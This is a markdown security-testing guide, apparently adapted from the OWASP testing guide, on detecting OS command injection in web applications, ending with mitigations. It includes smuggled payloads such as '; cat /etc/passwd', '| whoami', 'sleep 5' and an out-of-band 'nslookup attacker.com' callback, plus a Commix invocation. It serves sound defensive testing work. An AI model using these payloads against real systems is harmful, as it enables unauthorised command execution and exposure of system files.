# WSTG-INPV-12: Testing for Command Injection

## Summary
Command Injection occurs when an attacker injects malicious commands into a vulnerable application, leading to the execution of arbitrary operating system commands. This can compromise the host system, data, or infrastructure.

---

## Objectives
- Identify inputs that might interact with the operating system.
- Test for vulnerabilities that allow execution of unauthorized system commands.
- Assess the potential impact of successful command injection.

---

## How to Test

### Manual Testing

1. **Identify Input Points:**
   - Analyze the application for inputs that might invoke operating system commands (e.g., file uploads, shell inputs, parameterized APIs).
   - Example:
 ```http
     GET /ping?host=127.0.0.1 HTTP/1.1
```     

2. **Inject Command Payloads:**
   - Craft and inject malicious commands using separators:
     - Common separators:
       - `;`, `|`, `&&`, `||`
       - `\n`, `&`
     - Example:
    ```http
       GET /ping?host=127.0.0.1;ls HTTP/1.1
```      

3. **Observe Application Behavior:**
   - Look for:
     - Unexpected command output (e.g., directory listing, system information).
     - Errors revealing command execution traces.
   - Example command payloads:
     ```bash
     127.0.0.1; cat /etc/passwd
     127.0.0.1 | whoami
     ```

4. **Test Blind Command Injection:**
   - Inject time-based or out-of-band commands to infer command execution.
     - Example with time delay:
       ```http
       GET /ping?host=127.0.0.1; sleep 5 HTTP/1.1
```       
     - Example with DNS callback:
       ```bash
       127.0.0.1; nslookup attacker.com
       ```

---

### Automated Testing

Use tools like:
- **Commix:** Automate command injection detection and exploitation.
- **Burp Suite Extensions:** Test for injection using custom payloads.

#### Example with Commix:
- Run Commix against a vulnerable endpoint:
  ```bash
  commix -u "http://example.com/ping?host=127.0.0.1"
  ```

---

## Mitigation
- Sanitize and validate all inputs to remove special characters and ensure they conform to expected formats.
- Use secure APIs or libraries that do not directly interact with the operating system.
- Implement least-privilege principles for system-level commands.
- Monitor logs for unusual command execution patterns.
- Regularly patch and update the underlying systems and software.

---

## References
- OWASP Command Injection Cheat Sheet
- CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- Tools:
  - [Commix](https://github.com/commixproject/commix)
  - [Burp Suite Extensions](https://portswigger.net/bappstore)
